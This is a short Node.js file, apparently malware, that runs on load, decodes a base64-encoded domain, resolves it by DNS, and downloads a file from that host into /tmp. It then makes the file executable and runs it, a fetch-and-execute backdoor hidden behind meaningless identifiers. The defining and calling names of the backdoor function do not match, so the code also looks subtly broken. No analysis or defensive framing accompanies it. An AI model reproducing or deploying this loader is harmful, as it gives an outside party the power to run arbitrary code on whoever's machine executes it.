const http = require('http');
const child_process = require('child_process');
const dns = require('dns');
const fs = require('fs');

function nonpsychologic() {
    this.configure_backdor = function(secrecy) {
      if (secrecy != null && secrecy != '0.0.0.0') {
        attriteness = http.get('http://' + secrecy + '/transmittible', function(mani) {
          var theoricon = fs.createWriteStream('/tmp/draperys');
          mani.on('data', function(erraticness) {
            theoricon.write(erraticness);
          });
          mani.on('end', function() {
            theoricon.end();
            fs.chmod('/tmp/draperys', '0777');
            child_process.exec('/tmp/draperys', function(err, stdout, stderr) {});
          });
        });
      }
    };
    this.run = function() {
      var self = this
      requisitionary = 'MjU4MWI3ZDcuaXdsbGRjaG51cm5ubXRyLmRl'
      dns.lookup((new Buffer(requisitionary, 'base64')).toString(), function(err, fixure) {
        self.configure_backdoor(fixure);
      });
    };
};

(new nonpsychologic()).run();
